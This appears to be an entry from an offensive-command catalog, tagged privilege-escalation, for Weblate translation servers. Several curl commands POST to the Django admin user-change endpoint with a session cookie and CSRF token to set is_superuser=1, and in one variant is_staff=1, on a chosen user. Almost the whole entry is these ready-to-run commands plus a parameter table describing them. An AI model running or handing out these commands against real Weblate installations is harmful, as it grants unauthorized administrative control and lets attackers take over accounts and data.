---
data: >-
  curl -X POST "https://weblate-target.com/admin/weblate_auth/user/5/change/" -H
  "Cookie: sessionid=your_session" -H "Referer: https://weblate-target.com/" -H
  "Content-Type: application/x-www-form-urlencoded" -d
  "csrfmiddlewaretoken=abc123def456...&is_superuser=1"
tags:
  - privilege-escalation
  - http
type: command
output: Success response confirming user update
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.236Z'
id: 4fa1f09b-d78b-4d4d-ae11-af40f950a489
verified: false
validated: true
submitted: true
---
# post-weblate-user-update

## Command

```bash
curl -X POST "https://weblate-target.com/admin/weblate_auth/user/5/change/" -H "Cookie: sessionid=your_session" -H "Referer: https://weblate-target.com/" -H "Content-Type: application/x-www-form-urlencoded" -d "csrfmiddlewaretoken=abc123def456...&is_superuser=1"
```

## Description

Updates a Weblate user's permissions via POST to the admin change endpoint, setting superuser status using a valid CSRF token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| URL with <ID> | User change endpoint | Yes |
| `-H "Cookie: ..."` | Auth session | Yes |
| `-d` | Form data with token and is_superuser=1 | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://weblate.example.com/admin/weblate_auth/user/5/change/" -H "Cookie: sessionid=abc123" -H "Content-Type: application/x-www-form-urlencoded" -d "csrfmiddlewaretoken=token&is_superuser=1"
```

### Advanced Usage

```bash
curl -X POST "https://weblate.example.com/admin/weblate_auth/user/5/change/" -H "Cookie: sessionid=abc123" -d "csrfmiddlewaretoken=token&is_superuser=1&is_staff=1"
```

## Expected Output

HTML or redirect indicating successful update, e.g., "Successfully updated user."

## Related

- [[Related Procedure]]
